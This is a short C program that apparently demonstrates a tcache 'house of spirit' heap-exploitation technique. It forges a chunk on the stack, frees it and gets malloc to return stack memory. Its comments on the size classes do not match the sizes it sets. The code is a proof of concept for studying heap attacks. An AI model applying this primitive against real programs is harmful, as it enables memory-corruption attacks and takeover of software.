#include <stdio.h>
#include <stdlib.h>

int main() {
	malloc(1);
	unsigned long long *p;
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
	fprintf(stderr, "The fake chunk a: %p\n", &fake_chunks[0]);
	fprintf(stderr, "The fake chunk b: %p\n", &fake_chunks[6]);

	fake_chunks[1] = 0x30;			// size	(tcache 0x110)
	fake_chunks[7] = 0x1234;			// next.size

	fprintf(stderr, "overwrite a pointer with the first fake mem: %p\n", &fake_chunks[2]);
	p = &fake_chunks[2];

	fprintf(stderr, "free the overwritten pointer\n");
	free(p);

	fprintf(stderr, "malloc a new chunk: %p\n", malloc(0x20));	// (tcache 0x100)
}
